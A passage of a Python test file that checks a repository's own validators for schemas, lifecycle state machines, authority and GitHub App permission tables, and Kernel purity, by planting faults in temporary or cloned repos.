"""The checks themselves must catch what they claim to catch.

`tree()` builds a throwaway repo holding a planted fault. `clone()` copies this repo and plants
one in the copy, so that a check is run from its front door and not only by its parts.
"""
from __future__ import annotations

import ast
import base64
import contextlib
import copy
import hashlib
import importlib.machinery
import io
import json
import os
import pathlib
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

from kernel import derive, terms
from sim import world
from tests import support
from tools import (check_apps, check_authority, check_context, check_decisions, check_examples, check_lifecycle,
                   check_purity, check_repo, check_trials, check_workflows, mutants, needs_passed, redact_trial, verify,
                   walk)
from tools.hooks import protected
from tools.jsonschema_lite import SchemaError, validate

ROOT = check_authority.ROOT
GOOD = (ROOT / "examples" / "workflows" / "verify.yml").read_text()
STEP = "      - run: make verify\n"


SCRATCH = tempfile.TemporaryDirectory()     # removed when the run ends


def tree(files: dict) -> pathlib.Path:
    """A throwaway repo holding `files`, for a check to be run against."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def clone(files: dict) -> pathlib.Path:
    """A copy of this repo with `files` written over it."""
    root = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "repo"
    walk.copy(ROOT, root)
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def modules_in(suite) -> set:
    """The modules whose tests are in `suite`, at any depth."""
    found = set()
    for item in suite:
        if isinstance(item, unittest.TestSuite):
            found |= modules_in(item)
        else:
            found.add(type(item).__module__)
    return found


FILE, GITLINK = 0o100644, 0o160000


def git_index(paths: dict, version: int = 2) -> bytes:
    """git's index as git writes it, holding `paths` ({path: mode}). Version 3 marks every entry extended."""
    out, previous = b"", b""
    for path, mode in sorted(paths.items()):
        name = path.encode()
        flags = len(name) | (0x4000 if version == 3 else 0)
        entry = bytes(24) + mode.to_bytes(4, "big") + bytes(32) + flags.to_bytes(2, "big")
        entry += bytes(2) if version == 3 else b""
        if version == 4:    # the path is cut to what differs from the one before, and not padded
            same = len(os.path.commonprefix([previous, name]))
            entry += bytes([len(previous) - same]) + name[same:] + b"\0"
        else:
            entry += name + b"\0" * (8 - (len(entry) + len(name)) % 8)
        out, previous = out + entry, name
    data = b"DIRC" + version.to_bytes(4, "big") + len(paths).to_bytes(4, "big") + out
    return data + hashlib.sha1(data, usedforsecurity=False).digest()


def commit(root: pathlib.Path, paths: dict, version: int = 2) -> pathlib.Path:
    """Write git's index into `root`, as though `paths` had been committed. Returns `root`."""
    (root / ".git").mkdir(exist_ok=True)
    (root / ".git" / "index").write_bytes(git_index(paths, version))
    return root


def git(root: pathlib.Path, *args: str) -> str:
    """Run git in `root`, apart from this machine's configuration and any git that is running this."""
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM="1")
    return subprocess.run(["git", "-C", str(root), *args], env=env, check=True, capture_output=True, text=True).stdout


def staged(files: dict, *config: str, objects: str = "sha1") -> pathlib.Path:
    """A repo holding `files`, all added by git itself, after `config` ("key=value") is set. Nothing is committed."""
    root = tree(files)
    git(root, "init", "-q", "--object-format=" + objects)
    for setting in config:
        git(root, "config", *setting.split("=", 1))
    git(root, "add", "-f", ".")
    return root


def held_by_git(root: pathlib.Path) -> dict:
    """{path: mode} as git itself lists its index."""
    entries = (line.split("\t", 1) for line in git(root, "ls-files", "-s", "-z").split("\0") if line)
    return {path: int(meta.split()[0], 8) for meta, path in entries}


def checked(data: bytes) -> bytes:
    """`data`, an index without its last 20 bytes, with a SHA-1 of it put back."""
    return data + hashlib.sha1(data, usedforsecurity=False).digest()


def caught(problems: list, words: str) -> bool:
    return any(words in p for p in problems)


WALKS = {"walk", "fwalk", "rglob", "scandir", "copytree"}


def walkers(source: str) -> list:
    """(line, name) for each way `source` walks or copies a tree, read from its syntax, not its spelling."""
    found = []
    for node in ast.walk(ast.parse(source)):
        line = getattr(node, "lineno", 0)
        syntax = isinstance(node, ast.Attribute) and getattr(node.value, "id", "") == "ast"   # ast.walk
        if isinstance(node, ast.Attribute) and node.attr in WALKS and not syntax:
            found.append((line, node.attr))
        elif isinstance(node, ast.ImportFrom) and node.module != "tools":
            found += [(line, a.name) for a in node.names if a.name in WALKS]
        elif isinstance(node, ast.Call):
            name = getattr(node.func, "attr", getattr(node.func, "id", ""))
            if name in WALKS and isinstance(node.func, ast.Name):
                found.append((line, name))
            recursive = any(k.arg == "recursive" and not (isinstance(k.value, ast.Constant) and k.value.value is False)
                            for k in node.keywords)
            starred = any(isinstance(a, ast.Constant) and "**" in str(a.value) for a in node.args)
            if name in ("glob", "iglob") and (recursive or starred):
                found.append((line, name))
    return found


def rules(text: str) -> list:
    return sorted({rule for rule, _ in check_workflows.lint(text)})


class Validator(unittest.TestCase):
    def test_rejects_a_schema_it_cannot_enforce(self):
        with self.assertRaises(SchemaError):
            validate({}, {"type": "object", "patternProperties": {}})

    def test_a_boolean_is_not_an_integer(self):
        self.assertTrue(validate(True, {"type": "integer"}))

    def test_unexpected_property_is_an_error(self):
        schema = {"type": "object", "additionalProperties": False, "properties": {"a": {"type": "string"}}}
        self.assertEqual(validate({"a": "x", "b": 1}, schema), ["$: unexpected b"])

    def test_an_item_given_twice_is_an_error_where_items_are_unique(self):
        unique = {"type": "array", "uniqueItems": True}
        self.assertEqual(validate(["AC-1", "AC-2"], unique), [])
        self.assertEqual(validate(["AC-1", "AC-2", "AC-1"], unique), ["$: an item is given twice"])
        self.assertEqual(validate([{"a": 1, "b": 2}, {"b": 2, "a": 1}], unique), ["$: an item is given twice"])
        # The other side: without the keyword, or with it false, an item may come twice.
        for schema in ({"type": "array"}, {"type": "array", "uniqueItems": False}):
            self.assertEqual(validate(["AC-1", "AC-1"], schema), [])

    def test_a_code_that_ends_in_a_newline_is_not_a_code(self):
        code = {"type": "string", "pattern": "^[a-z_]+$"}
        self.assertEqual(validate("empty_diff", code), [])
        self.assertTrue(validate("empty_diff\n", code))

    def test_a_schema_that_accepts_unknown_fields_is_caught(self):
        self.assertEqual(check_examples._open({"type": "object", "properties": {"a": {"type": "object"}}}),
                         ["$", "$.properties.a"])
        self.assertEqual(check_examples._open({"type": "object", "additionalProperties": {"type": "string"}}), [])
        for loose in (None, "no", {}, True):
            self.assertEqual(check_examples._open({"type": ["object", "null"], "additionalProperties": loose}), ["$"])

    def test_a_key_written_twice_is_refused(self):
        path = tree({"x.json": '{"limit": 3, "limit": 30}'}) / "x.json"
        with self.assertRaises(ValueError):
            check_examples._load(path)


class Examples(unittest.TestCase):
    def test_a_counter_example_that_is_accepted_is_caught(self):
        fine = (ROOT / "examples" / "facts.json").read_text()
        root = clone({"examples/invalid/facts.carries-prose.json": fine})
        self.assertTrue(caught(check_examples.run(root), "was accepted, and must be rejected"))

    def test_a_counter_example_wrong_in_two_ways_is_caught(self):
        facts = json.loads((ROOT / "examples" / "invalid" / "facts.carries-prose.json").read_text())
        facts["schema"] = "facts/2"
        root = clone({"examples/invalid/facts.carries-prose.json": json.dumps(facts)})
        self.assertTrue(caught(check_examples.run(root), "is wrong in 2 ways"))

    def test_an_example_that_does_not_validate_is_caught(self):
        self.assertTrue(caught(check_examples.run(clone({"examples/decision.json": "{}"})), "decision.json: $: missing"))

    def test_a_coverage_that_leaves_a_criterion_uncovered_is_caught(self):  # decision 0029
        # Valid to its schema, a coverage example is judged by kernel/coverage.py too, against the rubric, the Finding
        # example and the paths the facts example changes: no schema can say every criterion that applies is there.
        left = (ROOT / "examples" / "invalid" / "coverage.a-criterion-that-applies-left-out.json").read_text()
        whole = (ROOT / "examples" / "coverage.json").read_text()
        self.assertTrue(caught(check_examples.run(clone({"examples/coverage.json": left})),
                               "coverage.json: $: uncovered PR-4"))
        self.assertTrue(caught(check_examples.run(clone({"examples/invalid/coverage.a-criterion-that-applies-left-out"
                                                         ".json": whole})), "was accepted, and must be rejected"))
        problems = check_examples.run(clone({"examples/finding.json": "{}"}))
        self.assertTrue(caught(problems, "coverage.json: $: uncovered PR-3"))

    def test_only_success_can_pass_a_check(self):  # I-27, L-07
        # The configuration may say what a conclusion means, but never that one with no verdict has passed.
        schema = json.loads((ROOT / "schemas" / "config.schema.json").read_text())
        defaults = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(validate(defaults, schema), [])
        for conclusion in sorted(set(defaults["check_conclusions"]) - {"success"}) + ["a_value_github_adds_later"]:
            for reading in ("passing", None, "", "ignored"):
                cfg = copy.deepcopy(defaults)
                cfg["check_conclusions"][conclusion] = reading
                self.assertTrue(validate(cfg, schema), (conclusion, reading))
        for reading in ("failing", "pending", "unreadable", "missing"):
            cfg = copy.deepcopy(defaults)
            if reading == "missing":
                del cfg["check_conclusions"]["success"]
            else:
                cfg["check_conclusions"]["success"] = reading
            self.assertTrue(validate(cfg, schema), reading)

    def test_a_schema_with_no_example_and_a_data_file_with_no_schema_are_caught(self):
        root = clone({"schemas/verdict.schema.json": '{"type": "object", "additionalProperties": false}',
                      "config/extra.json": "{}", "examples/invalid/nothing.x.json": "{}"})
        problems = check_examples.run(root)
        self.assertTrue(caught(problems, "schema verdict has no example"))
        self.assertTrue(caught(problems, "config/extra.json is validated against no schema"))
        broken = check_examples.run(clone({"examples/facts.json": '{"schema": "facts/1", "schema": "facts/1"}',
                                           "schemas/rubric.schema.json": "{not json"}))
        self.assertTrue(caught(broken, "examples/facts.json cannot be read: a key is written twice"))
        self.assertTrue(caught(broken, "schemas/rubric.schema.json cannot be read"))
        self.assertTrue(caught(broken, "config/rubric-pr-review.json: no schema named rubric"))
        self.assertTrue(caught(problems, "no schema named nothing"))


def unbound(lc: dict, bound: str) -> dict:
    """`lc` with `bound` taken off every transition that names it."""
    return dict(lc, transitions=[dict(tr, bound=None) if tr["bound"] == bound else tr for tr in lc["transitions"]])


class Lifecycle(unittest.TestCase):
    def test_an_unbounded_factory_cycle_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) in (("adjudicating", "addressing"), ("addressing", "adjudicating")):
                tr["bound"] = None
        self.assertTrue(caught(check_lifecycle.check(lc), "a cycle with no person in it has no bound"))

    def test_a_dead_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["transitions"] = [tr for tr in lc["transitions"] if tr["from"] != "queued"]
        self.assertIn("no terminal state can be reached from: queued", check_lifecycle.check(lc))

    def test_a_hold_the_factory_could_end_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        # L-02. A Hold ends when a person acts, or when the content that caused it changes; never by the Factory.
        self.assertIn(("held", "verifying", "platform"), {(tr["from"], tr["to"], tr["by"]) for tr in lc["transitions"]})
        lc["transitions"].append({"from": "held", "to": "verifying", "by": "factory", "bound": "max_attempts"})
        self.assertIn("the Factory makes no transition out of a Hold: held -> verifying is by factory",
                      check_lifecycle.check(lc))

    def test_an_issue_the_factory_could_serve_again_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load("issue"))
        lc["transitions"].append({"from": "not_served", "to": "ready", "by": "factory", "bound": None})
        self.assertTrue(caught(check_lifecycle.check(lc), "only a person takes a Work item out of not_served"))

    def test_an_undeclared_person_only_state_is_caught(self):
        lc = dict(check_lifecycle.load(), person_only_exits=["limbo"])
        problems = check_lifecycle.check(lc)
        self.assertTrue(caught(problems, "person_only_exits names an undeclared state: limbo"), problems)

    def test_malformed_lifecycle_data_is_reported_not_raised(self):
        pr = check_lifecycle.load()
        pr["transitions"][0].pop("by")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": "[]", "lifecycle/pull_request.json": json.dumps(pr)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json does not match the Lifecycle schema"), problems)
        self.assertTrue(caught(problems, "lifecycle/pull_request.json does not match the Lifecycle schema"), problems)
        self.assertTrue(check_lifecycle.check({"states": "x"}))
        self.assertTrue(caught(check_lifecycle.run(clone({"config/defaults.json": "[]"})), "config/defaults.json"))
        self.assertTrue(caught(check_lifecycle.run(clone({"schemas/lifecycle.schema.json": "[]"})),
                               "schemas/lifecycle.schema.json"))

    def test_a_state_nothing_declares_or_reaches_or_times_is_caught(self):
        lc = copy.deepcopy(check_lifecycle.load())
        lc["states"].append("limbo")
        lc["transitions"].append({"from": "merged", "to": "nowhere", "by": "human", "bound": None})
        problems = check_lifecycle.check(lc)
        for words in ("state can never be reached: limbo", "no staleness limit for: limbo",
                      "a terminal state has a way out: merged", "an undeclared state: nowhere"):
            self.assertTrue(caught(problems, words), words)

    def test_an_issue_retried_with_no_bound_is_caught(self):
        # I-14. The cycle that failed the issue Lifecycle's first drawing: `ready` to `in_progress`
        # and back, when an opening Run ends having opened nothing.
        lc = check_lifecycle.load("issue")
        self.assertEqual(check_lifecycle.check(lc), [])
        self.assertIn(("in_progress", "ready", "factory", "max_attempts"),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        self.assertIn("a cycle with no person in it has no bound: ready -> in_progress -> ready",
                      check_lifecycle.check(unbound(lc, "max_attempts")))

    def test_an_issue_retried_after_every_unmerged_close_is_caught(self):
        # I-43. `in_progress` or `in_review` back to `ready`, when a linked pull request closes unmerged.
        lc = check_lifecycle.load("issue")
        self.assertTrue(caught(check_lifecycle.check(unbound(lc, "max_unmerged_closes")),
                               "a cycle with no person in it has no bound"))

    def test_verify_checks_the_issue_lifecycle_too(self):
        lc = unbound(check_lifecycle.load("issue"), "max_attempts")
        problems = check_lifecycle.run(clone({"lifecycle/issue.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: a cycle with no person in it"), problems)
        self.assertFalse(caught(problems, "lifecycle/pull_request.json"), problems)

    def test_a_work_item_with_no_lifecycle_is_caught(self):
        root = clone({"lifecycle/issues.json": (ROOT / "lifecycle" / "issue.json").read_text()})
        (root / "lifecycle" / "issue.json").unlink()
        problems = check_lifecycle.run(root)
        self.assertTrue(caught(problems, "no Lifecycle for the Work item issue"), problems)
        self.assertTrue(caught(problems, "lifecycle/issues.json declares the Work item issue"), problems)

    def test_a_bound_that_is_not_a_limit_is_caught(self):
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        del config["limits"]["max_unmerged_closes"]
        problems = check_lifecycle.run(clone({"config/defaults.json": json.dumps(config)}))
        self.assertTrue(caught(problems, "lifecycle/issue.json: the bound max_unmerged_closes is not a limit"),
                        problems)

    def test_the_act_ceiling_can_bound_a_transition(self):
        # An enqueue is an act, not a Run; a cycle through the merge queue is bounded by the act ceiling.
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) == ("converged", "queued"):
                tr["bound"] = "max_acts_per_item"
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(check_lifecycle.check(lc, config["limits"]), [])
        del config["limits"]["max_acts_per_item"]
        self.assertTrue(caught(check_lifecycle.check(lc, config["limits"]), "the bound max_acts_per_item is not a limit"))

    def test_a_cycle_through_a_lens_with_no_bound_is_caught(self):
        # L-04 and I-14 hold for any cycle with no person in it, not only one the Factory makes alone.
        # A Lens that flipped `converged` and `addressing` on unchanged content would go round for ever.
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertEqual(check_lifecycle.check(check_lifecycle.load(), limits), [])
        lc = copy.deepcopy(check_lifecycle.load())
        for tr in lc["transitions"]:
            if (tr["from"], tr["to"]) == ("addressing", "converged"):
                tr["by"] = "lens"
        self.assertIn("a cycle with no person in it has no bound: addressing -> converged -> addressing",
                      check_lifecycle.check(lc, limits))

    def test_a_cycle_through_the_platform_with_no_bound_is_caught(self):
        # A merge queue that ejects every time, and an enqueue made again each time it does.
        lc = check_lifecycle.load()
        lc["transitions"] = [dict(tr, bound=None) if (tr["from"], tr["to"]) == ("converged", "queued") else tr
                             for tr in lc["transitions"]]
        problems = check_lifecycle.check(lc)
        self.assertTrue(any(p.startswith("a cycle with no person in it has no bound: ") and "converged -> queued" in p
                            for p in problems), problems)
        problems = check_lifecycle.run(clone({"lifecycle/pull_request.json": json.dumps(lc)}))
        self.assertTrue(caught(problems, "lifecycle/pull_request.json: a cycle with no person in it"), problems)

    def test_a_hold_only_a_person_ends_is_bound_by_a_person_and_nothing_else_is(self):
        # A Hold an App places has no ceiling behind it, and stands until a person removes it.
        lc = check_lifecycle.load()
        self.assertIn(("verifying", "held", "platform", check_lifecycle.PERSON),
                      {(tr["from"], tr["to"], tr["by"], tr["bound"]) for tr in lc["transitions"]})
        limits = json.loads((ROOT / "config" / "defaults.json").read_text())["limits"]
        self.assertEqual(check_lifecycle.check(lc, limits), [])
        for tr in ({"from": "verifying", "to": "addressing", "by": "lens", "bound": check_lifecycle.PERSON},
                   {"from": "verifying", "to": "held", "by": "human", "bound": check_lifecycle.PERSON}):
            problems = check_lifecycle.check(dict(lc, transitions=lc["transitions"] + [tr]), limits)
            self.assertTrue(caught(problems, "the bound person is only for a Hold that no person makes"), tr)
        # Without it, the platform's way out of a Hold on the content closes a cycle with no person in it.
        self.assertTrue(caught(check_lifecycle.check(unbound(lc, check_lifecycle.PERSON)),
                               "a cycle with no person in it has no bound"))

    def test_a_bound_the_kernel_does_not_count_for_each_item_is_caught(self):
        # A limit on size or on the whole org stops nothing going round on one item.
        for limit in ("max_diff_lines", "org_max_active_runs"):
            lc = check_lifecycle.load()
            for tr in lc["transitions"]:
                if (tr["from"], tr["to"]) == ("converged", "queued"):
                    tr["bound"] = limit
            words = "the bound %s is not a limit the Kernel counts for each item" % limit
            self.assertTrue(caught(check_lifecycle.check(lc), words), limit)
            problems = check_lifecycle.run(clone({"lifecycle/pull_request.json": json.dumps(lc)}))
            self.assertTrue(caught(problems, "lifecycle/pull_request.json: " + words), problems)

    def test_a_pull_request_not_served_can_be_served_again_but_not_by_a_loop(self):
        # A stacked pull request is not served until GitHub retargets it, so `not_served` is not terminal.
        lc = check_lifecycle.load()
        self.assertNotIn("not_served", lc["terminal"])
        self.assertEqual(lc["stale_after_minutes"]["not_served"], 1440)
        exits = {(tr["to"], tr["by"]) for tr in lc["transitions"] if tr["from"] == "not_served"}
        self.assertLessEqual({("verifying", "platform"), ("draft", "platform"), ("closed", "human")}, exits)
        self.assertEqual(check_lifecycle.check(lc), [])
        lc["transitions"].append({"from": "verifying", "to": "not_served", "by": "platform", "bound": None})
        self.assertIn("a cycle with no person in it has no bound: verifying -> not_served -> verifying",
                      check_lifecycle.check(lc))


class Authority(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "authority.json").read_text())

    def test_security_may_never_be_declined(self):
        self.table["categories"]["security"]["may_accept"].append("declined")
        self.assertTrue(caught(check_authority.run(self.table), "security"))

    def test_the_author_may_not_own_a_category(self):
        self.table["categories"]["functional"]["owner"] = "dev-lead"
        self.assertTrue(caught(check_authority.run(self.table), "author Role"))

    def test_a_value_held_twice_must_agree(self):
        self.table["max_rounds"] = 9
        self.assertTrue(caught(check_authority.run(self.table), "max_rounds differs"))

    def test_a_category_nobody_owns_is_caught(self):
        del self.table["categories"]["human"]
        self.table["categories"]["performance"] = {"owner": "pr-review", "may_accept": ["fixed"]}
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "category human, and nobody owns it"))
        self.assertTrue(caught(problems, "performance has an owner, and no Finding can carry it"))

    def test_a_thread_carries_the_categories_a_finding_does(self):
        facts = json.loads((ROOT / "schemas" / "facts.schema.json").read_text())
        enum = facts["properties"]["threads"]["items"]["properties"]["category"]["enum"]
        enum.remove("security")
        enum.append("style")
        problems = check_authority.run(self.table, facts=facts)
        self.assertTrue(caught(problems, "a thread may carry the category style, and no Finding can"))
        self.assertTrue(caught(problems, "a Finding may carry the category security, and no thread can"))
        # A schema with no category on a thread is a problem reported, not one raised.
        del facts["properties"]["threads"]["items"]["properties"]["category"]
        self.assertTrue(caught(check_authority.run(self.table, facts=facts), "a thread in the facts carries no category"))

    def test_the_kernel_reads_the_categories_and_severities_a_finding_carries(self):
        for name, value in (("CATEGORIES", terms.CATEGORIES[1:]), ("SEVERITIES", terms.SEVERITIES + ("critical",))):
            with mock.patch.object(terms, name, value):
                self.assertTrue(caught(check_authority.run(self.table), "the Kernel reads the"), name)

    def test_the_status_on_the_item_never_carries_a_required_lens_name(self):
        # The Controller posts the status on the item as a check run under one fixed name. Under a required Lens's
        # name it would speak for that Lens: a deterministic Lens's check, or a model Lens's.
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        self.assertEqual(check_authority.run(self.table, config), [])
        required = config["required_lenses"]
        names = [lens[key] for lens in required["deterministic"] for key in ("lens", "check")] + required["model"]
        # A Lens's name or its check's, in any case and with any space around it: a reader of names may fold either.
        for name in names + [n.upper() for n in names] + [" %s\t" % n for n in names]:
            problems = check_authority.run(self.table, dict(config, status_on_item=name))
            self.assertTrue(caught(problems, "the status on the item is named %r, a required Lens's" % name), name)

    def test_a_lens_or_a_check_named_twice_is_refused(self):
        # Two entries for one Lens, or for one check, could each pin another App: which one reads the Lens is unclear.
        config = json.loads((ROOT / "config" / "defaults.json").read_text())
        lenses = config["required_lenses"]["deterministic"]
        for twice in (dict(lenses[0], app_id=1000001), dict(lenses[1], lens=lenses[0]["lens"].upper()),
                      dict(lenses[1], lens="another", check=" %s " % lenses[0]["check"])):
            config["required_lenses"]["deterministic"] = lenses + [twice]
            self.assertTrue(caught(check_authority.run(self.table, config), "is named twice"), twice)
        config["required_lenses"]["deterministic"] = lenses
        # So is a model Lens named twice, or one that shares a deterministic Lens's name.
        model = config["required_lenses"]["model"]
        for twice in (model + [model[0]], model + [" %s" % lenses[0]["lens"].upper()]):
            config["required_lenses"]["model"] = twice
            self.assertTrue(caught(check_authority.run(self.table, config), "is named twice"), twice)
        # The other side: each named once.
        config["required_lenses"]["model"] = model
        self.assertEqual(check_authority.run(self.table, config), [])

    def test_a_category_a_model_judges_needs_a_role_and_no_role_shadows_itself(self):
        self.table["categories"]["functional"]["owner"] = "human"
        self.table["categories"]["security"]["shadow"] = "pr-review"
        problems = check_authority.run(self.table)
        self.assertTrue(caught(problems, "needs a Role as owner") and caught(problems, "cannot shadow itself"))


class Apps(unittest.TestCase):
    def setUp(self):
        self.table = json.loads((ROOT / "config" / "apps.json").read_text())
        self.apps, self.needs = self.table["apps"], self.table["needs"]

    def check(self) -> list:
        facts = (ROOT / "schemas" / "facts.schema.json").read_text()
        return check_apps.run(tree({"config/apps.json": json.dumps(self.table), "schemas/facts.schema.json": facts}))

    def test_no_app_may_change_a_workflow_or_upload_to_code_scanning(self):
        # GitHub refuses an App's push under .github/workflows/ without `workflows`, and with `security_events: write`
        # an App could upload to code scanning under CodeQL's tool and category. No Factory App holds either, at any
        # level, whatever need it names.
        self.assertEqual(self.check(), [])
        for name in ("workflows", "security_events"):
            for level in ("read", "write"):
                self.setUp()
                self.apps["controller"]["permissions"][name] = {"level": level, "needs": ["read:facts.checks"]}
                said = "controller: holds %s; no Factory App may" % name
                self.assertTrue(caught(self.check(), said), (name, level))

    def test_a_permission_nothing_needs_is_caught(self):
        self.apps["controller"]["permissions"]["checks"]["needs"] = []
        del self.apps["reader"]["permissions"]["issues"]["needs"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: checks names no Effect, write or read that needs it"))
        self.assertTrue(caught(problems, "reader: issues names no Effect, write or read that needs it"))

    def test_the_reader_given_any_write_is_caught(self):
        self.apps["reader"]["permissions"]["contents"]["level"] = "write"
        self.apps["reader"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "reader: contents is write; the reader App writes nothing"))
        self.assertTrue(caught(problems, "reader: pull_requests serves effect:comment; the reader App writes nothing"))

    def test_a_write_that_only_a_read_needs_is_caught(self):
        self.apps["pr-review"]["permissions"]["contents"]["level"] = "write"
        self.assertTrue(caught(self.check(), "pr-review: contents is write and only a read needs it"))

    def test_a_need_served_by_another_permission_or_level_is_caught(self):
        self.apps["controller"]["permissions"]["contents"]["needs"].append("read:facts.reviews")
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "controller: contents serves read:facts.reviews, which the table maps to "
                                         "pull_requests"))
        self.assertTrue(caught(problems, "controller: pull_requests is read and serves effect:comment, which the "
                                         "table maps to pull_requests write"))

    def test_a_grant_for_a_need_that_is_waiting_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("read:facts.queue")
        self.assertTrue(caught(self.check(), "controller: pull_requests serves read:facts.queue, which waits on issue 26"))

    def test_a_write_need_held_by_two_apps_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"] = {"level": "write", "needs": ["effect:comment"]}
        self.assertTrue(caught(self.check(), "effect:comment is held by controller and pr-review"))

    def test_a_need_with_no_mapping_and_no_wait_is_caught(self):
        self.needs["read:facts.reviews"] = {}
        self.needs["read:facts.threads"] = {"permission": "pull_requests", "level": "read", "waits_on": "trial P-2"}
        del self.needs["read:facts.item"]
        problems = self.check()
        self.assertTrue(caught(problems, "read:facts.reviews maps to no permission and waits on nothing"))
        self.assertTrue(caught(problems, "read:facts.threads both maps to a permission and waits"))
        self.assertTrue(caught(problems, "controller: metadata serves read:facts.item, which is not in the table of needs"))

    def test_a_read_of_a_fact_that_does_not_exist_is_caught(self):
        self.needs["read:facts.title"] = {"permission": "pull_requests", "level": "read"}
        self.assertTrue(caught(self.check(), "read:facts.title reads a field facts/1 does not have"))

    def test_an_app_installed_across_the_org_is_caught(self):
        self.apps["controller"]["installed_on"] = "all"
        self.apps["reader"]["installed_on"] = ["combsmith"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: installed_on is not a list of named repos"))
        self.assertTrue(caught(problems, "reader: installed_on is not a list of named repos"))

    def test_a_repo_named_twice_is_caught(self):
        self.apps["reader"]["installed_on"].append(self.apps["reader"]["installed_on"][0])
        self.assertTrue(caught(self.check(), "reader: combsmith/software-factory is named twice in installed_on"))

    def test_an_app_named_for_another_key_is_caught(self):
        self.apps["controller"]["name"] = "combsmith-sf-reader"
        self.assertTrue(caught(self.check(), "controller: the App is named combsmith-sf-reader; name it "
                                             "combsmith-sf-controller"))

    def test_a_file_that_is_missing_or_cannot_be_read_is_a_problem_not_a_crash(self):
        self.assertTrue(caught(check_apps.run(tree({"x": ""})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{"})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{}"})), "names no Apps"))


class Purity(unittest.TestCase):
    def test_io_in_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "import os\n\ndef f():\n    return open('x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "imports os") and caught(problems, "uses open"))

    def test_io_in_a_package_below_the_kernel_is_caught(self):
        root = tree({"kernel/a.py": "from kernel.extra import clock\n", "kernel/extra/clock.py": "import time\n"})
        self.assertTrue(caught(check_purity.run(root), "extra/clock.py:1 imports time"))

    def test_a_limit_written_into_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "def f(runs):\n    return len(runs) >= 3 or runs[0] == 1\n"})
        self.assertEqual(len(check_purity.run(root)), 1)

    def test_only_the_calendar_may_write_a_number(self):
        # The calendar is nobody's choice, so it is the one place the Kernel writes a number but 0 and 1: in terms.py,
        # under its own name, with its own value. Any other number is a limit, and a limit is data.
        calendar = "MINUTES_PER_HOUR = 60\nLEAP_YEARS = (4, 100, 400)\nFEBRUARY = 2\n"
        self.assertEqual(check_purity.run(tree({"kernel/terms.py": calendar})), [])
        for rel, text in (("kernel/terms.py", "MINUTES_PER_HOUR = 61\n"), ("kernel/terms.py", "LEAP_YEARS = (4, 100, 401)\n"),
                          ("kernel/terms.py", "MINUTES_PER_HOUR = 60.0\n"), ("kernel/terms.py", "MAX_ATTEMPTS = 3\n"),
                          ("kernel/terms.py", "FEBRUARY = HOURS_PER_DAY = 2\n"), ("kernel/x.py", "MINUTES_PER_HOUR = 60\n"),
                          ("kernel/terms.py", "def f():\n    MINUTES_PER_HOUR = 60\n    return MINUTES_PER_HOUR\n")):
            self.assertTrue(caught(check_purity.run(tree({rel: text})), "writes the number"), (rel, text))
        # A unit is assigned once, so no second assignment can change it: not to 0, 1 or True, which are no number
        # the check refuses, and not from outside terms.py. What cannot be read as a value is a problem, not a crash.
        again = "SECONDS_PER_MINUTE = 60\nHOURS_PER_DAY = 24\n"
        for rel, text in (("kernel/terms.py", again + "SECONDS_PER_MINUTE = 1\n"),
                          ("kernel/terms.py", again + "HOURS_PER_DAY = True\n"),
                          ("kernel/terms.py", again + "HOURS_PER_DAY = 24\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE: int = 60\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE = {[]: 1}\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE, X = 60, 1\n"),
                          ("kernel/x.py", "from kernel import terms as t\n\ndef f():\n    t.SECONDS_PER_MINUTE = 1\n"),
                          ("kernel/x.py", "def f(n):\n    HOURS_PER_DAY = n\n    return HOURS_PER_DAY\n")):
            self.assertTrue(caught(check_purity.run(tree({"kernel/terms.py": again, rel: text})), "a unit of the calendar"),
                            (rel, text))
        self.assertEqual(check_purity.run(tree({"kernel/terms.py": again, "kernel/x.py": "def f(t):\n"
                                                "    return t.SECONDS_PER_MINUTE\n"})), [])

    def test_state_kept_between_calls_is_caught(self):
        root = tree({"kernel/x.py": "SEEN = {}\nKIND = 'held'\nNAMES = frozenset({'a'})\n"})
